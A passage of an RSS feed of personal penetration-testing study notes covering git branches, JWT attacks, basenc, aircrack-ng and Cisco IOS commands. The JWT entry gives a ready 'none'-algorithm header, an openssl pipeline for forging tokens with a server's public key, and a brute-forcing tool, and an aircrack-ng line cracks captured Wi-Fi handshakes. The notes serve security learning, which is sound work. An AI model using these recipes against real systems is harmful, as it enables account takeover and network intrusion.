&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                                &lt;span class=&quot;co&quot;&gt;# tracking branch&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Personal opinion:&lt;/strong&gt; GitHub deciding to switch &quot;master&quot; to &quot;main&quot; makes no sense to me. We talk about git &quot;branches&quot; and working &quot;trees&quot;. Shouldn't the central branch in a git tree be the &quot;trunk&quot;?&lt;/p&gt;</description>
			<pubDate>Tue, 28 Mar 2023 03:19:57 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Change%20the%20%22master%22%20Branch%20in%20Git%20to%20%22trunk%22.md</guid>
		</item>
		<item>
			<title>JWT (JSON Web Tokens) Attacks</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/JWT%20%28JSON%20Web%20Tokens%29%20Attacks.md</link>
			<description>&lt;p&gt;JSON web token format: &lt;code&gt;$HEADER.$PAYLOAD.$SIGNATURE&lt;/code&gt;, where each substring is (URL-safe) base64 encoded. These can be passed around as a user cookie, HTTP header, or queried from local storage.&lt;/p&gt;&lt;p&gt;&lt;code&gt;$HEADER&lt;/code&gt; and &lt;code&gt;$PAYLOAD&lt;/code&gt; are both JSON blobs, but &lt;code&gt;$SIGNATURE&lt;/code&gt; is binary data.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;$HEADER&lt;/code&gt; takes the form &lt;code&gt;{ &quot;alg&quot;: &quot;RS256&quot;, &quot;typ&quot;: &quot;JWT&quot; }&lt;/code&gt;, where &lt;code&gt;alg&lt;/code&gt; is a signing algorithm supported by the server.&lt;/li&gt;&lt;li&gt;&lt;code&gt;$PAYLOAD&lt;/code&gt; is a JSON blob containing various pieces of user information, which can include permissioning data. See jwt.io for a detailed breakdown.&lt;/li&gt;&lt;li&gt;&lt;code&gt;$SIGNATURE&lt;/code&gt; is the signature (using &lt;code&gt;alg&lt;/code&gt; from the &lt;code&gt;$HEADER&lt;/code&gt;) of &lt;code&gt;$HEADER.$PAYLOAD&lt;/code&gt; (both parts base64 encoded) using a server-side secret (often an SSL keyâ¦ but sometimes just a string!).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Use &lt;code&gt;basenc --base64url&lt;/code&gt; and &lt;code&gt;basenc -d --base64url&lt;/code&gt; to encode/decode URL-safe base64, rather than the &lt;code&gt;base64&lt;/code&gt; binary. Be sure to strip the trailing &lt;code&gt;=&lt;/code&gt; signs!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://jwt.io&quot;&gt;JSON Web Tokens&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22basenc%22.md&quot;&gt;Using &quot;basenc&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;attacks&quot;&gt;Attacks&lt;/h2&gt;&lt;h3 id=&quot;none-attacks&quot;&gt;&quot;None&quot; Attacks&lt;/h3&gt;&lt;p&gt;Sometimes servers will also support the &lt;code&gt;NONE&lt;/code&gt; signature type, which indicates that no signing is used (so the JWT is then just &lt;code&gt;$HEADER.$PAYLOAD.&lt;/code&gt; - note the trailing dot!). If the server allows the &lt;code&gt;none&lt;/code&gt; signing method, then it's often possible to just arbitrarily edit the &lt;code&gt;$PAYLOAD&lt;/code&gt; to gain access to other users.&lt;/p&gt;&lt;p&gt;The base64-encoded version of &lt;code&gt;{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;}&lt;/code&gt; is &lt;code&gt;eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0&lt;/code&gt;.&lt;/p&gt;&lt;h3 id=&quot;public-key-attacks&quot;&gt;Public Key Attacks&lt;/h3&gt;&lt;p&gt;JWT algorithms can use a server's &lt;em&gt;public&lt;/em&gt; key if &lt;code&gt;alg&lt;/code&gt; is &lt;code&gt;HS256&lt;/code&gt;. If the public half of the keypair used to sign the JWT is available somehow (for example, if it's been re-used as the server's HTTPS certificate), then we can harvest it and use it to forge new JWTs.&lt;/p&gt;&lt;p&gt;The base64-encoded version of &lt;code&gt;{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}&lt;/code&gt; is &lt;code&gt;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Use the following to generate a signature with the above &lt;code&gt;$HEADER&lt;/code&gt; and the PEM-formatted &lt;code&gt;$PUBLIC_KEY_FILE&lt;/code&gt; half of the public/private key to validate the JWTs (when &lt;code&gt;alg&lt;/code&gt; is &lt;code&gt;RS256&lt;/code&gt;):&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; -n &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$HEADER&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$PAYLOAD&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; dgst -sha256 -mac HMAC -macopt hexkey:&lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$PUBLIC_KEY_FILE&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;xxd&lt;/span&gt; -p &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;tr&lt;/span&gt; -d &lt;span class=&quot;st&quot;&gt;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sed&lt;/span&gt; -e &lt;span class=&quot;st&quot;&gt;&amp;#39;s/.*= //&amp;#39;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;tr&lt;/span&gt; -d &lt;span class=&quot;st&quot;&gt;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;xxd&lt;/span&gt; -p -r &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;basenc&lt;/span&gt; --base64url &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sed&lt;/span&gt; -e &lt;span class=&quot;st&quot;&gt;&amp;#39;s/=*$//&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;brute-forcing-weak-secrets&quot;&gt;Brute-Forcing Weak Secrets&lt;/h3&gt;&lt;p&gt;&lt;em&gt;If&lt;/em&gt; a weak secret (a simple string) is used to sign the JWT token, then it is sometimes possible to brute-force it using JWT-Cracker.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/lmammino/jwt-cracker&quot;&gt;lmammino / jwt-cracker&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Tue, 28 Mar 2023 03:19:57 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/JWT%20%28JSON%20Web%20Tokens%29%20Attacks.md</guid>
		</item>
		<item>
			<title>Using "basenc"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22basenc%22.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Encode $STRING to base64.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$STRING&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;basenc&lt;/span&gt; --base64&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Encode $STRING to URL-safe base64.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$STRING&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;basenc&lt;/span&gt; --base64url&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Dencode $BASE64_STRING from base64.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$BASE64_STRING&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;basenc&lt;/span&gt; -d --base64&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Dencode $BASE64_STRING from URL-safe base64.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-14&quot;&gt;&lt;a href=&quot;#cb1-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-15&quot;&gt;&lt;a href=&quot;#cb1-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$BASE64_STRING&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;basenc&lt;/span&gt; -d --base64url&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The advantage of &lt;code&gt;basenc&lt;/code&gt; over &lt;code&gt;base64&lt;/code&gt; is that &lt;code&gt;basenc&lt;/code&gt; supports URL-safe base64-encoding/decoding out of the box, which I've otherwise found is a pain to work with.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Tue, 28 Mar 2023 03:19:57 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22basenc%22.md</guid>
		</item>
		<item>
			<title>Using Aircrack-NG</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Aircrack-NG.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;aircrack-ng&lt;/span&gt; -b &lt;span class=&quot;va&quot;&gt;$BSSID&lt;/span&gt; -w &lt;span class=&quot;va&quot;&gt;$WORLDLIST_FILE&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$CAP_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
			<pubDate>Tue, 28 Mar 2023 03:19:57 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Aircrack-NG.md</guid>
		</item>
		<item>
			<title>Cisco IOS Cheatsheet</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Cisco%20IOS%20Cheatsheet.md</link>
			<description>&lt;h2 id=&quot;system-information&quot;&gt;System Information&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;show&lt;/span&gt; version                 # Software &lt;span class=&quot;kw&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;hardware&lt;/span&gt; information&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;show&lt;/span&gt; running-config          # Current configuration&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;show&lt;/span&gt; startup-config          # Boot configuration&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;show&lt;/span&gt; history                 # Command history buffer&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;show&lt;/span&gt; ip interface brief      # Interface overview&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;show&lt;/span&gt; interface &lt;span class=&quot;va&quot;&gt;$TYPE&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$NUM&lt;/span&gt;    # Detailed interface information&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;show&lt;/span&gt; interfaces description  # Interface descriptions&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;show&lt;/span&gt; interfaces status       # Status of all interfaces&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;show&lt;/span&gt; crypto key mypubkey rsa # Current SSH public key&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;show&lt;/span&gt; dhcp lease              # Current DHCP status/information&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;configuration-modes&quot;&gt;Configuration Modes&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;config&lt;/span&gt;           # General configuration mode&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;config&lt;/span&gt; interface # Interface configuration mode&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;config&lt;/span&gt; line      # Serial console configuration mode&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;general-configuration&quot;&gt;General Configuration&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$HOSTNAME&lt;/span&gt;                 # Set switch hostname&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;enable&lt;/span&gt; secret &lt;span class=&quot;va&quot;&gt;$MD5_PASS&lt;/span&gt;            # Set password using MD5 hash &lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;enable&lt;/span&gt; password &lt;span class=&quot;va&quot;&gt;$PASSWORD&lt;/span&gt;          # Set password using clear text&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;banner&lt;/span&gt; motd &lt;span class=&quot;va&quot;&gt;$BANNER&lt;/span&gt;                # Set login banner&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                                   &lt;span class=&quot;co&quot;&gt;# (use &amp;quot;$&amp;quot; like &amp;quot;EOF&amp;quot;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-6&quot;&gt;&lt;a href=&quot;#cb3-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ip&lt;/span&gt; default-gateway &lt;span class=&quot;va&quot;&gt;$IP_ADDRESS&lt;/span&gt;     # Set default gateway&lt;/span&gt;
&lt;span id=&quot;cb3-7&quot;&gt;&lt;a href=&quot;#cb3-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;copy&lt;/span&gt; running-config startup-config # Persiste current config&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;interface-configuration&quot;&gt;Interface Configuration&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Configure console port&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;config&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-4&quot;&gt;&lt;a href=&quot;#cb4-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;line&lt;/span&gt; con 0&lt;/span&gt;
&lt;span id=&quot;cb4-5&quot;&gt;&lt;a href=&quot;#cb4-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$PASSWORD&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-6&quot;&gt;&lt;a href=&quot;#cb4-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;login&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-7&quot;&gt;&lt;a href=&quot;#cb4-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-8&quot;&gt;&lt;a href=&quot;#cb4-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Configure terminal connections&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-9&quot;&gt;&lt;a href=&quot;#cb4-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-10&quot;&gt;&lt;a href=&quot;#cb4-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;config&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-11&quot;&gt;&lt;a href=&quot;#cb4-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;line&lt;/span&gt; vty 0 &lt;span class=&quot;va&quot;&gt;$VTTY_NUM&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-12&quot;&gt;&lt;a href=&quot;#cb4-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$PASSWORD&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-13&quot;&gt;&lt;a href=&quot;#cb4-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;login&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;line-configuration&quot;&gt;Line Configuration&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Configure network interface&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-3&quot;&gt;&lt;a href=&quot;#cb5-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;config&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-4&quot;&gt;&lt;a href=&quot;#cb5-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$IFACE_TYPE&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$IFACE_NUM&lt;/span&gt;&lt;/span&gt;
